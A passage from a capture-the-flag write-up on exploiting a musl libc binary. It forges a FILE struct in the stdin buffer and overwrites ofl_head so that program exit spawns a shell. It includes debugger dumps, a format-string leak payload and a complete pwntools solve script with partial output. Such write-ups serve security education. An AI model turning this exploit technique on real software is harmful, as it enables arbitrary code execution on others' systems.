</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82b1:      <span style=color:#a6e22e>cmp</span>    <span style=color:#66d9ef>QWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rbx</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x28</span>],<span style=color:#66d9ef>rax</span>     <span style=color:#75715e>// if (f-&gt;wpos != f-&gt;wbase)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82b5:      <span style=color:#a6e22e>je</span>     <span style=color:#ae81ff>0x7ffff7fb82c1</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82b7:      <span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>edx</span>,<span style=color:#66d9ef>edx</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82b9:      <span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>esi</span>,<span style=color:#66d9ef>esi</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82bb:      <span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rdi</span>,<span style=color:#66d9ef>rbx</span>
</span></span><span style=display:flex><span>   <span style=color:#960050;background-color:#1e0010>0</span>x7ffff7fb82be:      <span style=color:#a6e22e>call</span>   <span style=color:#66d9ef>QWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rbx</span><span style=color:#960050;background-color:#1e0010>+</span><span style=color:#ae81ff>0x48</span>]         <span style=color:#75715e>// f-&gt;write(f, 0, 0);
</span></span></span></code></pre></td></tr></table></div></div><p>We find that <code>wpos</code> is located at <code>FILE+0x28</code>, <code>wbase</code> at <code>FILE+0x38</code>, and <code>write</code> at <code>FILE+0x48</code>. Alrighty, so to call <code>system("/bin/sh")</code>, our fake <code>FILE</code> must have:</p><ol><li><code>FILE+0x0</code> equal to <code>"/bin/sh"</code> in its integer representation. We need this because the first argument to <code>f->write</code> is our <code>FILE</code> itself.</li><li><code>wpos != wbase</code> or <code>FILE+0x28 != FILE+0x38</code></li><li><code>write</code> or <code>FILE+0x48</code> equal to <code>system</code></li></ol><p>After making our fake <code>FILE</code>, the last thing we need to do is to overwrite <code>ofl_head</code> such that it points to it. Note that here I choose to overwrite <code>f->write</code>, but the same principles apply should you choose to overwrite <code>f->seek</code>.</p><h2 id=how-do-we-write-our-fake-file>How do We Write Our Fake <code>FILE</code>?<a hidden class=anchor aria-hidden=true href=#how-do-we-write-our-fake-file>#</a></h2><p>But wait, the <code>FILE</code> struct is huge, and we can only write 8 bytes at a time. So, what&rsquo;s the solution? Fortunately, <code>stdin</code> in this challenge is buffered. When a file stream is buffered, any input intended for it is explicitly stored in a memory buffer. We can see this for ourselves in the following example.</p><pre tabindex=0><code>pwndbg&gt; disass gift
Dump of assembler code for function gift:
   ...
   0x000000000040125d &lt;+45&gt;:    lea    rdi,[rip+0xd9c]        # 0x402000
=&gt; 0x0000000000401264 &lt;+52&gt;:    call   0x401060 &lt;scanf@plt&gt;
   0x0000000000401269 &lt;+57&gt;:    mov    rdi,rsp
   ...
End of assembler dump.
pwndbg&gt; b *(gift+57)
Breakpoint 3 at 0x401269
pwndbg&gt; r
Starting program: /home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched
AAAAAAAA
</code></pre><p>Here, I set a breakpoint right after a <code>scanf</code> call, then I sent in 8 <code>"A"s</code></p><pre tabindex=0><code>pwndbg&gt; search AAAAAAAA
Searching for byte: b&#39;AAAAAAAA&#39;
[anon_7ffff7ffc] 0x7ffff7ffc2e8 &#39;AAAAAAAA\n&#39;
[stack]         0x7fffffffd270 &#39;AAAAAAAA&#39;
pwndbg&gt; vmmap 0x7ffff7ffc2e8
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7ffb000     0x7ffff7ffc000 rw-p     1000  a1000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
►   0x7ffff7ffc000     0x7ffff7fff000 rw-p     3000      0 [anon_7ffff7ffc] +0x2e8
pwndbg&gt; x/gx &amp;stdin
0x7ffff7ffad60 &lt;stdin&gt;: 0x00007ffff7ffb180
pwndbg&gt; x/20gx 0x00007ffff7ffb180
0x7ffff7ffb180: 0x0000000000000009      0x00007ffff7ffc2f0
0x7ffff7ffb190: 0x00007ffff7ffc2f1      0x00007ffff7fb8277
0x7ffff7ffb1a0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb1b0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb1c0: 0x00007ffff7fb832b      0x0000000000000000
0x7ffff7ffb1d0: 0x00007ffff7fb83f6      0x00007ffff7ffc2e8 &lt;-- This is where our &#34;AAAAAAAA&#34; is stored. As a matter of fact, this address is the buffer used for stdin
0x7ffff7ffb1e0: 0x0000000000000400      0x0000000000000000
0x7ffff7ffb1f0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb200: 0x0000000000000000      0xffffffffffffffff
0x7ffff7ffb210: 0x0000000000000000      0x0000000000000000
pwndbg&gt;
</code></pre><p>After that, I searched the memory space for those 8 <code>"A"s</code> and found that it&rsquo;s stored in 2 places. One in the stack and the other in some place near libc. After further investigation, it can be found that this &ldquo;some place&rdquo; is actually the buffer used for <code>stdin</code>. If <code>stdin</code> were unbuffered in this challenge, those 8 <code>"A"s</code> would be discarded after it&rsquo;s been processed and wouldn&rsquo;t be stored in memory.</p><p>So, knowing this, we can insert our fake <code>FILE</code> right after our normal input to <code>scanf</code>. Then, we overwrite <code>ofl_head</code> to point to the <code>stdin</code> buffer. With this setup, <code>system("/bin/sh")</code> will be called when <code>__stdio_exit</code> is executed.</p><h2 id=solve-script>Solve Script<a hidden class=anchor aria-hidden=true href=#solve-script>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;wt.exe wsl -d Ubuntu&#39;</span><span style=color:#f92672>.</span>split()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(args<span style=color:#f92672>.</span>EXE <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;./chall_patched&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;localhost&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>8002</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL_LIBC:
</span></span><span style=display:flex><span>    libc <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>libc
</span></span><span style=display:flex><span><span style=color:#66d9ef>elif</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>    library_path <span style=color:#f92672>=</span> libcdb<span style=color:#f92672>.</span>download_libraries(<span style=color:#e6db74>&#39;ld-musl-x86_64.so.1&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> library_path:
</span></span><span style=display:flex><span>        exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF<span style=color:#f92672>.</span>patch_custom_libraries(exe<span style=color:#f92672>.</span>path, library_path)
</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>libc
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;ld-musl-x86_64.so.1&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;ld-musl-x86_64.so.1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start_local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start_remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> start_local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> start_remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>b *(main+118)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># -- Exploit goes here --</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Leak musl address</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%p%p%p%p%p%p%p%p|</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>24</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;.&#39;</span>),
</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;putchar&#39;</span>],
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;|&#39;</span>)
</span></span><span style=display:flex><span>libc_leak <span style=color:#f92672>=</span> u64(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>libc_address <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x62418</span>
</span></span><span style=display:flex><span>system <span style=color:#f92672>=</span> libc_address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x5bb7e</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ofl_head <span style=color:#f92672>=</span> libc_address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xa4e88</span>
</span></span><span style=display:flex><span>scanf_buf <span style=color:#f92672>=</span> libc_address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xa32e8</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>hex(libc_leak) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>hex(libc_address) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>hex(ofl_head) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>hex(scanf_buf) <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create a fake file and overwrite ofl_head to point to it</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Where: &#39;</span>, hex(ofl_head)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;What: &#39;</span>, flat(
</span></span><span style=display:flex><span>    (str(scanf_buf <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>16</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>),
</span></span><span style=display:flex><span>    int<span style=color:#f92672>.</span>from_bytes(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;little&#39;</span>),
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> p64(<span style=color:#ae81ff>0x0</span>),
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x0</span>, <span style=color:#75715e># wpos</span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x0</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x1</span>, <span style=color:#75715e># wbase</span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x0</span>, <span style=color:#75715e># read</span>
</span></span><span style=display:flex><span>    system, <span style=color:#75715e># write</span>
</span></span><span style=display:flex><span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></td></tr></table></div></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./solve.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Full RELRO
</span></span><span style=display:flex><span>    Stack:      Canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Stripped:   No
</span></span><span style=display:flex><span>    Debuginfo:  Yes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1&#39;</span>
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      Full RELRO
</span></span><span style=display:flex><span>    Stack:      Canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        PIE enabled
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to localhost on port 8002: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hex<span style=color:#f92672>(</span>libc_leak<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x7add684b6418&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hex<span style=color:#f92672>(</span>libc_address<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x7add68454000&#39;</span>
